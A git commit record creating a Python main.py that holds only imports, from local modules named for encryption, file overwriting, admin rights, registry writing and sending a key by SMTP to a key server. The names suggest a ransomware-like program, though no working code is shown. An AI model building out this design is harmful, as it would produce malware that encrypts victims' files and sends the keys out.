d1e5144b91e5fc016bc786fcef92300b49a7866d
LafondMael <71012200+LafondMael@users.noreply.github.com>
2021-10-28 12:57:51 -0400

    Create main.py

---
+++ main.py
@@ -0,0 +1,7 @@
+#!/usr/bin/python
+#coding:utf-8
+from modules.crypt import crypt
+from modules.admin import overwrite, admin_right
+from modules.system import  regwrite
+from modules.network import host_connect, sendkey_smtp, keyserver
+import os, sys, ctypes, time
